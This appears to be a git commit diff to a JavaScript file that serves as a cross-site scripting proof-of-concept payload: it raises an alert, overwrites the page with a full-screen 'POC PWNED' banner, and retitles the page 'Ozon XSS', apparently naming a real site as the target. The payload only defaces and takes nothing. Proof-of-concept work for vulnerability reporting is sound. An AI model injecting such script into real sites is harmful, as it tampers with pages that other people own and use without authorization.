f73548dc57db6d0e2394e8c546c1e5d919620c53
GMchik <chupanovgadji@gmail.com>
2026-02-27 17:21:37 +0300

    Update s.js

--- s.js
+++ s.js
@@ -3,6 +3,6 @@ alert('new_5');
 function(){
     setTimeout(function(){
         document.body.innerHTML = '<div style="background: #2b2b2b; color: #fff; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; position:fixed; top:0; left:0; width:100%; z-index:9999;"><div><h1>POC PWNED</h1><p>Test</p></div></div>';
-        document.title = 'pwned';
+        document.title = 'Ozon XSS';
     }, 0);
 }();void(0);
